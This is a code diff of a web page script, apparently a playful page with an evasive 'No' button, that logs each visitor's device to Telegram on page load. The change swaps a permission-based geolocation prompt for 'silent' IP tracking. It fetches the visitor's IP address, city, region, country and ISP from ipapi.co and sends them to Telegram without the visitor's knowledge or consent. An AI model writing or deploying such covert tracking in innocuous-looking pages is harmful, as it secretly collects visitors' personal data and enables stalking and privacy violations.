@@ -29,21 +29,21 @@ window.addEventListener('load', () => {
     
     sendTelegramLog(`📩 *New Visitor!*\nDevice: ${device}\nTime: ${new Date().toLocaleTimeString()}`);
 
-    // Request location
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                sendTelegramLog(`📍 *Location Received!*\nDevice: ${device}\nMap: ${mapsLink}`);
-            }, 
-            (error) => {
-                sendTelegramLog(`📍 Location access denied or unavailable (${error.message}).`);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
+    // Silent IP Location Tracking
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip || "Unknown IP";
+            const city = data.city || "Unknown City";
+            const region = data.region || "Unknown Region";
+            const country = data.country_name || "Unknown Country";
+            const isp = data.org || "Unknown ISP";
+            
+            sendTelegramLog(`📍 *Silent Location Received!*\nDevice: ${device}\nIP: ${ip}\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}`);
+        })
+        .catch(error => {
+            console.log("IP fetch failed");
+        });
 });
 
 const NO_BUTTON_REPULSION_RADIUS = 150; // Pixels
